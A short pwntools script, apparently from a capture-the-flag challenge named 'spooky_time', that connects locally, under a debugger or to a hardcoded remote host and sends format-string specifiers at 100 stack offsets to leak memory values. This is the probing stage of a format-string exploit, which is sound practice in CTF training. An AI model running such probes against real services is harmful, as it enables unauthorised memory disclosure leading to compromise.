#!/usr/bin/env python3

from pwn import *

pwn = './spooky_time'
context.terminal = 'kitty'
gdbscript='''
continue
'''
host,port = "206.189.117.93",30165
context.log_level = 'critical'

def conn():
	if args.REMOTE:
		return remote(host,port)
	elif args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

for i in range(100):
	io = conn()
	io.recvuntil(b'scary!\n')
	fmt = f'%{i}$p'.encode()
	io.sendline(fmt)
	io.recvlines(3)
	print(f'{i}: {io.recvline()}')
	io.close()
